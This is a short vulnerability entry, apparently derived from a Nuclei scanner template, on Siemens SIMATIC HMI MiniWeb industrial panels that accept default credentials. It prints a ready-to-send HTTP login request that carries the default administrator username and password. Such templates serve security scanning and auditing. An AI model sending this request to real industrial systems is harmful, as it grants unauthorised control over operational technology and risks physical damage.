# Vulnerability: Siemens SIMATIC HMI Miniweb - Default Login
**Classification:** ICS
**Source:** Nuclei Template (`siemens-simatic-default-login.yaml`)

## Description
Identified Siemens SIMATIC HMI MiniWeb interfaces that were accessible using default credentials.These interfaces are used to remotely monitor and control Human-Machine Interface (HMI) panels deployed in industrial environments. Leaving the default login in place posed a significant risk to operational technology (OT) systems.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /FormLogin HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

Login=Administrator&Redirection=/Templates/Loginpage.html&Password=100
```

